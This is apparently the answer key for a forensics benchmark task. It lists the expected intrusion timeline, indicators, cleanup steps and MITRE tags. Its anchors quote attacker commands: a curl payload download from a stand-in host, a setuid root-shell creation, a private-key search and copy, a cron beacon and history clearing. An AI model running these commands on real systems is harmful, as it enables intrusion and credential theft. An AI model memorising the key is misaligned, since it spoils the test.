@@ -1,0 +1,209 @@
+{
+  "task_id": "task_101_32_sysadmin_forensics",
+  "difficulty": "Hard",
+  "schema": "a+b",
+  "schema_notes": "concept-level timeline plus structured evidence and IOC handoff",
+  "skills_declared": [
+    "sysadmin-toolbox",
+    "claw-shell"
+  ],
+  "ground_truth": {
+    "expected_event_count": 12,
+    "required_stages": [
+      "entry",
+      "privilege_escalation",
+      "lateral",
+      "persistence",
+      "anti_forensics"
+    ],
+    "required_outputs": {
+      "markdown": "/tmp_workspace/results/forensics.md",
+      "evidence_csv": "/tmp_workspace/results/evidence.csv",
+      "iocs_json": "/tmp_workspace/results/iocs.json"
+    },
+    "evidence_csv_columns": [
+      "event_id",
+      "timestamp",
+      "phase",
+      "source_file",
+      "evidence_text",
+      "interpretation",
+      "recommended_action"
+    ],
+    "expected_timeline_events": [
+      {
+        "id": "E01",
+        "phase": "noise",
+        "source_file": "auth.log",
+        "anchor": "Failed password for invalid user oracle from 203.0.113.77",
+        "meaning": "internet password-spray noise, not the confirmed compromise"
+      },
+      {
+        "id": "E02",
+        "phase": "noise",
+        "source_file": "auth.log",
+        "anchor": "Accepted publickey for deploy from 10.0.0.45",
+        "meaning": "normal internal deploy/admin access"
+      },
+      {
+        "id": "E03",
+        "phase": "entry",
+        "source_file": "auth.log",
+        "anchor": "Accepted publickey for user from 198.51.100.4",
+        "meaning": "attacker used a public key to enter as user"
+      },
+      {
+        "id": "E04",
+        "phase": "entry",
+        "source_file": "history.txt",
+        "anchor": "curl -fsSL https://example.test/r.sh -o /tmp/pwn.sh",
+        "meaning": "downloaded staging payload"
+      },
+      {
+        "id": "E05",
+        "phase": "entry",
+        "source_file": "history.txt",
+        "anchor": "/tmp/pwn.sh --stage foothold",
+        "meaning": "ran foothold payload"
+      },
+      {
+        "id": "E06",
+        "phase": "privilege_escalation",
+        "source_file": "auth.log",
+        "anchor": "COMMAND=/bin/bash -c id; cp /bin/bash /tmp/.bash && chmod 4755 /tmp/.bash",
+        "meaning": "used sudo to create setuid root shell"
+      },
+      {
+        "id": "E07",
+        "phase": "privilege_escalation",
+        "source_file": "syslog",
+        "anchor": "name=\"/tmp/.bash\" inode=803733 mode=0104755 ouid=0 ogid=0",
+        "meaning": "kernel audit confirms setuid root shell on disk"
+      },
+      {
+        "id": "E08",
+        "phase": "lateral",
+        "source_file": "history.txt",
+        "anchor": "grep -R 'BEGIN OPENSSH PRIVATE KEY' /home 2>/dev/null",
+        "meaning": "searched home directories for private keys"
+      },
+      {
+        "id": "E09",
+        "phase": "lateral",
+        "source_file": "history.txt",
+        "anchor": "scp /home/alice/.ssh/id_rsa edge-host:/tmp/alice_id_rsa",
+        "meaning": "copied Alice's SSH private key to edge-host"
+      },
+      {
+        "id": "E10",
+        "phase": "lateral",
+        "source_file": "syslog",
+        "anchor": "a0=\"ssh\" a1=\"-i\" a2=\"/home/alice/.ssh/id_rsa\" a3=\"alice@db-staging\"",
+        "meaning": "lateral SSH to db-staging using Alice's stolen key"
+      },
+      {
+        "id": "E11",
+        "phase": "persistence",
+        "source_file": "history.txt",
+        "anchor": "printf '* * * * * /tmp/pwn.sh --beacon\\n' | crontab -",
+        "meaning": "installed per-minute cron persistence"
+      },
+      {
+        "id": "E12",
+        "phase": "anti_forensics",
+        "source_file": "history.txt",
+        "anchor": "history -c",
+        "meaning": "attempted to clear shell history"
+      }
+    ],
+    "expected_per_phase_anchors": {
+      "noise": [
+        "Failed password for invalid user oracle from 203.0.113.77",
+        "Accepted publickey for deploy from 10.0.0.45"
+      ],
+      "entry": [
+        "Accepted publickey for user from 198.51.100.4",
+        "curl -fsSL https://example.test/r.sh -o /tmp/pwn.sh",
+        "/tmp/pwn.sh --stage foothold"
+      ],
+      "privilege_escalation": [
+        "COMMAND=/bin/bash -c id; cp /bin/bash /tmp/.bash && chmod 4755 /tmp/.bash",
+        "name=\"/tmp/.bash\" inode=803733 mode=0104755 ouid=0 ogid=0"
+      ],
+      "lateral": [
+        "grep -R 'BEGIN OPENSSH PRIVATE KEY' /home 2>/dev/null",
+        "scp /home/alice/.ssh/id_rsa edge-host:/tmp/alice_id_rsa",
+        "a0=\"ssh\" a1=\"-i\" a2=\"/home/alice/.ssh/id_rsa\" a3=\"alice@db-staging\""
+      ],
+      "persistence": [
+        "printf '* * * * * /tmp/pwn.sh --beacon\\n' | crontab -"
+      ],
+      "anti_forensics": [
+        "history -c"
+      ]
+    },
+    "confirmed_iocs": {
+      "accounts": [
+        "user",
+        "alice"
+      ],
+      "external_ips": [
+        "198.51.100.4"
+      ],
+      "internal_hosts": [
+        "edge-host",
+        "db-staging"
+      ],
+      "files_or_paths": [
+        "/tmp/pwn.sh",
+        "/tmp/.bash",
+        "/home/alice/.ssh/id_rsa",
+        "/tmp/alice_id_rsa",
+        "/tmp/notes.log"
+      ],
+      "persistence": [
+        "* * * * * /tmp/pwn.sh --beacon"
+      ],
+      "stolen_credentials": [
+        "/home/alice/.ssh/id_rsa"
+      ]
+    },
+    "likely_noise": [
+      {
+        "indicator": "203.0.113.77",
+        "reason": "failed password attempts only; no successful session"
+      },
+      {
+        "indicator": "deploy from 10.0.0.45",
+        "reason": "successful internal deploy/admin login before the confirmed attack window"
+      },
+      {
+        "indicator": "/usr/local/sbin/backup-staging",
+        "reason": "root backup cron predates the attacker cron change"
+      }
+    ],
+    "cleanup_minimum": [
+      "Disable/rotate the compromised user and alice SSH keys (reference /home/alice/.ssh/id_rsa)",
+      "Remove /tmp/pwn.sh and /tmp/.bash and inspect for setuid files",
+      "Remove the user crontab beacon * * * * * /tmp/pwn.sh --beacon and audit all user crontabs",
+      "Block or investigate 198.51.100.4 and preserve logs",
+      "Review sudoers and root command history around /bin/bash use; clean /tmp/alice_id_rsa and /tmp/notes.log"
+    ],
+    "cleanup_action_target_iocs_required": true,
+    "min_cleanups_with_ioc_reference": 5,
+    "mitre_phase_tagging_required": true,
+    "min_phases_with_mitre_tag": 4,
+    "mitre_acceptable_techniques": [
+      "T1078",
+      "T1110",
+      "T1059",
+      "T1053",
+      "T1048",
+      "T1003",
+      "T1505",
+      "T1547",
+      "T1027",
+      "T1070"
+    ]
+  }
+}
